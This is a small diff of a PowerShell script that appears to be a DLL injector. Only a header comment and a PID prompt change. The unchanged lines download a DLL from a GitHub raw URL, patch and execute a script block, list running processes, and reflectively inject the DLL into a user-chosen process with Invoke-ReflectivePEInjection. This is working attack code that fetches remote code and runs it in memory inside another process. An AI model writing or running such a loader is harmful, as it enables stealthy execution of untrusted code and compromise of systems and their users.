@@ -1,4 +1,4 @@
-# inject_minimal.ps1 - สั้นที่สุด
+# inject_short.ps1
 
 $dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"
 $dllBytes = (iwr -UseBasicParsing $dllUrl).Content
@@ -8,5 +8,5 @@ $ps1 = $ps1 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(
 . ([ScriptBlock]::Create($ps1))
 
 Get-Process | Select Id, ProcessName | Format-Table -AutoSize
-$p = Read-Host "PID"
+$p = Read-Host "Enter PID"
 Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $p
